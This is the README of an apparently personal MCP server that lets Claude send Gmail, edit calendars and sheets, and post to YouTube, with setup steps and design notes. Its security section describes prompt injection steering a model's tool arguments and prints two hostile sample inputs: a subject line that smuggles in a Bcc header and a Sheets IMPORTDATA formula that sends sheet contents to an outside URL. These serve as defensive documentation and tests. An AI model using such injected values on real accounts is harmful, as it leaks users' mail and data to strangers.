# google-workspace-mcp

[![CI](https://github.com/brettadams0/google-workspace-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/brettadams0/google-workspace-mcp/actions/workflows/ci.yml)
[![Surface checked by mcp-surface](https://img.shields.io/badge/surface-mcp--surface-7c3aed.svg)](https://github.com/brettadams0/mcp-surface)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/badge/node-%E2%89%A520-brightgreen.svg)](package.json)

An [MCP](https://modelcontextprotocol.io) server that gives Claude write access to a personal Google account — Gmail, Drive, Calendar, Sheets, and YouTube — backed by a **self-owned Google Cloud OAuth client** rather than a hosted third-party connector. It can **send real email**, not just draft it.

23 tools across 5 Google APIs. Runs locally over stdio.

```
You:    email me a summary of today's calendar
Claude: [calendar_list_events] → 4 events
        [gmail_send_email]     → delivered
```

## Why own the OAuth client

The hosted Google connectors are read-mostly. Making Claude *act* — send a real email, create a real invite, write a real spreadsheet cell — means holding the OAuth client yourself. That single decision drives most of what's interesting below.

## Design notes

### Least-privilege scopes, chosen to avoid a paid security review

Google classifies `gmail.readonly` and `drive.readonly` as **Restricted** scopes. Shipping an app that uses them requires a [CASA security assessment](https://developers.google.com/workspace/guides/configure-oauth-consent) — a paid, recurring third-party audit. That is not a sensible cost for a single-user personal tool, so this server requests **only write scopes**:

| Scope | Why |
|---|---|
| `gmail.send`, `gmail.compose` | Send and draft. Never reads the inbox. |
| `drive.file` | Can only touch files *it created itself* — cannot read pre-existing Drive content. |
| `calendar.events`, `calendar.readonly` | Calendar is not a restricted scope. |
| `spreadsheets` | Read and write sheets by ID. |
| `youtube.force-ssl` | Playlists, subscriptions, comments, ratings. |

Reading arbitrary Gmail and Drive content is left to the existing claude.ai connectors. The two halves compose: read there, act here.

### Arguments are untrusted, even though the caller is your own assistant

Every argument to these tools is model output, and a model that has just read a web page or an email can be steered by text it found there. A server that sends mail and writes spreadsheets has to treat its inputs the way a web server treats a form post:

- **Header injection.** Subjects, addresses and attachment filenames are interpolated into the MIME message. A line break in any of them would start a new header — `Subject: Hi\r\nBcc: someone@example.com` quietly copies the mail to a stranger — so line breaks are refused with an error rather than stripped. Non-ASCII subjects and filenames are encoded per RFC 2047 and RFC 2231 instead of being written raw.
- **Formula injection.** Sheets' `USER_ENTERED` mode parses a string as if it were typed, so `=IMPORTDATA("https://…"&A1)` becomes a live formula that can post the sheet's contents to any URL. `sheets_write_range` writes `RAW` by default; formula parsing is an explicit `valueInputOption` the tool description tells the model never to use for text it read elsewhere.
- **Bodies survive transport.** Generated HTML is often one very long line, and SMTP caps lines at 998 octets. Every body part is base64-encoded so no relay has a reason to break it inside a tag.

Each of these has a test that builds the hostile input and asserts on the bytes that would go to Google.

### Irreversible tools say so in their own descriptions

A tool description is the only thing the model reads before deciding to call it, so the warnings live there rather than in a confirmation layer the model can route around. From `src/gmail.js`:

> *Sends an email immediately from the authorized Gmail account, optionally with file attachments. This is a real send with no draft/review step and cannot be undone.*

Every tool also declares [MCP tool annotations](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) — `readOnlyHint`, `destructiveHint`, `idempotentHint` — so a client can auto-approve the reads and prompt for the rest.

Several tools are externally visible under your real identity: `gmail_send_email` delivers to real inboxes, `calendar_create_event` emails invitations, and the YouTube comment tools post publicly. They are ordinary tools — but they're the ones where a mistake is visible to other people.

### Calendar invitations are actually sent

Google's Calendar API emails **no one** unless the request says otherwise, so "invite alice@example.com" used to produce an event Alice never heard about unless she happened to use Google Calendar. The create, update and delete tools now send `sendUpdates: "all"` by default — matching what their descriptions promise — and take `sendUpdates: "none"` when a change shouldn't notify anybody.

### The refresh token expires every ~7 days — this is expected

The OAuth client sits in Google's **Testing** publishing mode, and Google invalidates refresh tokens for testing-mode apps after **7 days of inactivity**. Auth breaking after a week away is normal maintenance, not a bug:

```bash
npm run check-auth   # is the stored token still good?
npm run authorize    # re-consent in the browser; rewrites credentials/token.json
```

Moving to "In production" would remove the expiry but triggers exactly the verification review the scope choices above were made to avoid. For a single-user setup, periodic re-authorization is the cheaper trade.

The consent flow uses PKCE and a `state` check, and its callback listener binds to loopback only.

### Refreshed tokens are persisted

`google-auth-library` emits a `tokens` event when it silently refreshes an access token. `src/auth.js` listens and merges the result back to disk, so a long-lived session doesn't lose its refresh token across restarts.

## Setup

Requires Node 20+.

### 1. Create the OAuth client

1. In the [Google Cloud Console](https://console.cloud.google.com/), create a project.
2. Enable the **Gmail**, **Google Calendar**, **Google Drive**, **Google Sheets**, and **YouTube Data v3** APIs.
3. Under *APIs & Services → OAuth consent screen*: **External**, publishing status **Testing**, and add your own Google account under *Test users*.
4. Under *Credentials*, create an **OAuth client ID** of type **Desktop app**.
5. Download the JSON to `credentials/client_secret.json`.

`credentials/` is git-ignored. See `credentials/client_secret.example.json` for the expected shape.

### 2. Authorize

```bash
npm ci
npm run authorize
```

Opens a loopback listener on `localhost:53682`, prints a consent URL, and writes the refresh token to `credentials/token.json`. Google shows an "unverified app" warning — expected for a Testing-status client only you can use.

### 3. Register with your client

Claude Code:

```bash
claude mcp add google-workspace --scope user -- node /absolute/path/to/google-workspace-mcp/src/index.js
```

Claude Desktop (`claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "google-workspace": {
      "command": "node",
      "args": ["/absolute/path/to/google-workspace-mcp/src/index.js"]
    }
  }
}
```

## Tools

**Gmail**

| Tool | Effect | Purpose |
|---|---|---|
| `gmail_send_email` | writes | Send a real message — delivered immediately, not a draft |
| `gmail_create_draft` | writes | Compose without sending |
| `gmail_list_drafts` | read-only | List existing drafts |

**Calendar**

| Tool | Effect | Purpose |
|---|---|---|
| `calendar_list_events` | read-only | Events in a time range |
| `calendar_create_event` | writes | Create an event; emails attendees unless `sendUpdates` says otherwise |
| `calendar_update_event` | writes | Modify an existing event |
| `calendar_delete_event` | **destructive** | Remove an event and send cancellations |

**Drive / Sheets**

| Tool | Effect | Purpose |
|---|---|---|
| `drive_create_file` | writes | Create a file in Drive |
| `sheets_read_range` | read-only | Read an A1-notation range |
| `sheets_write_range` | **destructive** | Overwrite an A1-notation range (`RAW` unless told otherwise) |

**YouTube**

| Tool | Effect | Purpose |
|---|---|---|
| `youtube_search` | read-only | Search videos, channels, playlists |
| `youtube_get_video` / `youtube_get_channel` | read-only | Metadata and statistics |
| `youtube_list_playlists` / `youtube_list_playlist_items` | read-only | Playlist contents |
| `youtube_get_comments` / `youtube_list_subscriptions` | read-only | Comment threads, subscriptions |
| `youtube_create_playlist` / `youtube_add_to_playlist` | writes | Build playlists |
| `youtube_post_comment` / `youtube_reply_to_comment` | writes | Post publicly |
| `youtube_rate_video` / `youtube_subscribe` | writes | Like / dislike / clear, subscribe |

The exact schemas the model sees are in [`mcp-surface.json`](mcp-surface.json).

## Development

```bash
npm test               # unit tests — no network, no credentials
npm run lint           # ESLint
npm run surface        # start the server and diff its tool surface against mcp-surface.json
npm run surface:update # re-record mcp-surface.json after an intended change
```

The tests register every tool, assert the MIME builder's output byte-for-byte where it matters (header injection, encoded words, line lengths, boundaries), and check the requests that would go to Google — `sendUpdates`, `valueInputOption`, timeouts — by handing the API clients an auth object that records each request instead of sending it.

`npm run surface` runs [mcp-surface](https://github.com/brettadams0/mcp-surface) against the real server, the way a client connects. CI fails if the advertised tools differ from the committed snapshot in any way, so a renamed tool, a reworded description or a dropped annotation has to show up as a reviewed diff. It also holds the definitions to a 16 KB budget, since they are resent on every request.

## Layout

```
src/auth.js            OAuth client construction, token load/refresh persistence
src/shared.js          version, request timeout, tool-result helpers
src/gmail.js           MIME assembly (headers, encoding, attachments) + gmail_* tools
src/calendar.js        calendar_* tools
src/drive.js           drive_* tools
src/sheets.js          sheets_* tools
src/youtube.js         youtube_* tools
src/index.js           McpServer construction + stdio transport
scripts/authorize.js   OAuth consent flow (PKCE, state, loopback-only listener)
scripts/check-token.js token health check
scripts/smoke-test.js  live end-to-end send to the account's own address
test/tools.test.js     offline tests
mcp-surface.json       the committed tool surface CI compares against
```

## Auth files

Both live in `credentials/`, which is git-ignored and checked by CI:

- `client_secret.json` — the OAuth client, downloaded from Google Cloud Console
- `token.json` — access + refresh tokens, written by `npm run authorize`

Neither has ever been committed. If `credentials/` is lost, re-download the client secret and re-run `npm run authorize`.

## Notes

- Each Google API comes from its own `@googleapis/*` package rather than the monolithic `googleapis`, which is now over 240 MB because it bundles every Google API there is. Five APIs need about 7 MB; `node_modules` went from 282 MB to 45 MB.
- Every Google request has a 30-second timeout, so a stalled connection fails the tool call with an error instead of hanging it.
- Scopes are requested up front at authorize time. Adding a new API later means re-running `npm run authorize` so the new scope is granted.

## Privacy policy

Google requires a published policy on the consent screen even for a Testing-status app: [brettadams0.github.io/google-workspace-mcp-policy](https://brettadams0.github.io/google-workspace-mcp-policy/) ([source](https://github.com/brettadams0/google-workspace-mcp-policy)).

## License

MIT — see [LICENSE](LICENSE). Changes are recorded in [CHANGELOG.md](CHANGELOG.md).
